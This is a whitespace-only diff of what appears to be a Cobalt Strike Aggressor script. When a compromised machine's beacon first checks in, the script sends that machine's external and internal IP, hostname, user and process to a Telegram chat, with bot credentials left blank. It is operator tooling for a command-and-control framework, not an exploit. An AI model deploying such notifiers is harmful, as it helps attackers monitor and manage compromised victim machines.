@@ -3,7 +3,7 @@ import java.net.URLConnection;
 import java.io.DataOutputStream;
 
 sub http_request {
-  $url = $1;
+	$url = $1;
 	$body = $2;
 	#println($url);
 	#println($body);
@@ -26,23 +26,23 @@ sub http_request {
 
 sub sendnot{
 	$message = $1;
-  #telegram bot token
+	#telegram bot token
 	$bot_token = "";
-  #telegram chatid
+	#telegram chatid
 	$chat_id = "";
 	$url = "https://api.telegram.org/bot". $bot_token. "/sendMessage";
 	$body = "{"."\"chat_id\":\"$chat_id\"".","."\"text\":\"$message\""."}";
 	$code = http_request($url,$body);
-  #success 200 | failed 400
+	#success 200 | failed 400
 	println("responseCode:" . $code);
 }
 
 on beacon_initial {
-    $bid = $1;
-    $external_ip = beacon_info($bid, "external");
-    $internal_ip = beacon_info($bid, "internal");
-    $hostname = beacon_info($bid, "computer");
-    $user = beacon_info($bid, "user");
+	$bid = $1;
+	$external_ip = beacon_info($bid, "external");
+	$internal_ip = beacon_info($bid, "internal");
+	$hostname = beacon_info($bid, "computer");
+	$user = beacon_info($bid, "user");
 	#whitelist, if you don't need this, please delete the lines 44-47 and the if-else structure.
 	$wl = @("SystemSettings.exe");
 	$process = beacon_info($bid, "process");
